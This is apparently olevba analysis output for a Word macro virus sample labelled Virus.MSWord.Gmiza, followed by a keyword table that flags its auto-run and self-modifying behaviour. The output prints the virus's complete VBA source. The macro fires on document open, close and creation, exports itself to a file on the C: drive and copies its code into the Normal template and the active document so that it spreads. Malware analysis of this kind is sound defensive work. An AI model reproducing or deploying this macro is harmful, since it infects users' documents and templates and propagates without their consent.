olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gmiza
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gmiza - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_New(): Document_Open: End Sub
Private Sub Document_Close(): Document_Open: End Sub
Private Sub Document_Open(): Dim a, b, c: x = x + 1
ThisDocument.VBProject.vbcomponents(x).Export ("C:\Syswin32.drv")
If NormalTemplate.VBProject.vbcomponents(x).codemodule.CountOfLines = 0 Then
    With NormalTemplate.VBProject.vbcomponents(x).codemodule
    .AddFromFile "c:\syswin32.drv"
    .DeleteLines x, x + 3
    End With
End If
If ActiveDocument.VBProject.vbcomponents(x).codemodule.CountOfLines = 0 Then
   With ActiveDocument.VBProject.vbcomponents(x).codemodule
   .AddFromFile "c:\syswin32.drv"
   .DeleteLines x, x + 3
   End With
End If
If NormalTemplate.VBProject.vbcomponents(x).codemodule.CountOfLines < 46 Then
    With NormalTemplate.VBProject.vbcomponents(x).codemodule
    .DeleteLines x, .CountOfLines
    .AddFromFile "c:\syswin32.drv"
    .DeleteLines x, x + 3
    End With
End If
If ActiveDocument.VBProject.vbcomponents(x).codemodule.CountOfLines < 46 Then
   With ActiveDocument.VBProject.vbcomponents(x).codemodule
   .DeleteLines x, .CountOfLines
   .AddFromFile "c:\syswin32.drv"
   .DeleteLines x, x + 3
   End With
End If
With Application
.Assistant.TipOfDay = True
.Assistant.Animation = msoAnimationBeginSpeaking
.Assistant.AssistWithAlerts = False
.Assistant.Sounds = True
.Selection.TypeText "Covjek je gospodar svoje rijeci, ali kad ta rijec izadje iz njega on postaje njen rob!"
End With
With ActiveDocument
.Words(x).Underline = wdUnderlineDottedHeavy
    For u = x To 7
    .Shapes.AddLine 7, 7, 7, 7
    Next u
End With
'WM.Gmizavac by e[ax] / Species VL
'Authorized distribution for Bosnia and Herzegovina
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

